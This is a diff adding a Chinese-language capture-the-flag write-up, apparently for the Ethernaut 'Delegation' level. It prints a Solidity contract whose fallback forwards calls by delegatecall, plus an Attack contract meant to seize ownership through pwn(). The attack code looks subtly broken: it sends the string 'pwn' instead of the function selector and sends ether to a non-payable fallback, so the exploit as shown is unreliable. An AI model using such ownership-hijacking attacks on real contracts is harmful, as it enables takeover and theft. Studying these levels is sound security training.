@@ -446,6 +446,97 @@ solidity 0.8.0 版本之后会自动检查整型溢出错误，所以用0.6.0测
 
 ![image-20240410162429139](README.assets/image-20240410162429139.png)
 
+# Delegation
+
+## 漏洞代码
+
+```
+题目要求：此级别的目标是让您声明对给定实例的所有权
+```
+
+```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Delegate {
+    address public owner;
+
+    constructor(address _owner) {
+        owner = _owner;
+    }
+
+    function pwn() public {
+        owner = msg.sender;
+    }
+}
+
+contract Delegation {
+    address public owner;
+    Delegate delegate;
+
+    constructor(address _delegateAddress) {
+        delegate = Delegate(_delegateAddress);
+        owner = msg.sender;
+    }
+
+    fallback() external {
+        (bool result,) = address(delegate).delegatecall(msg.data);
+        if (result) {
+            this;
+        }
+    }
+}
+```
+
+## 分析&攻击
+
+Delegate合约倒简单，直接换个用户调用pwn()就改掉了owner
+
+```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Delegate {
+    address public owner;
+
+    constructor(address _owner) {
+        owner = _owner;
+    }
+
+    function pwn() public {
+        owner = msg.sender;
+    }
+}
+
+contract Delegation {
+    address public owner;
+    Delegate delegate;
+
+    constructor(address _delegateAddress) {
+        delegate = Delegate(_delegateAddress);
+        owner = msg.sender;
+    }
+
+    fallback() external {
+        (bool result,) = address(delegate).delegatecall(msg.data);
+        if (result) {
+            this;
+        }
+    }
+}
+
+contract Attack{
+    Delegation delegation;
+    constructor(Delegation _delegateAddress) payable {
+        delegation = Delegation(_delegateAddress);
+    }
+    function attackDelegate() public payable {
+        (bool isSuccess, /* memory data */ ) = payable(address(delegation)).call{value: 1 wei}("pwn");
+        require(isSuccess, "Failure! Ether not send.");
+    }
+}
+```
+
 
 
 
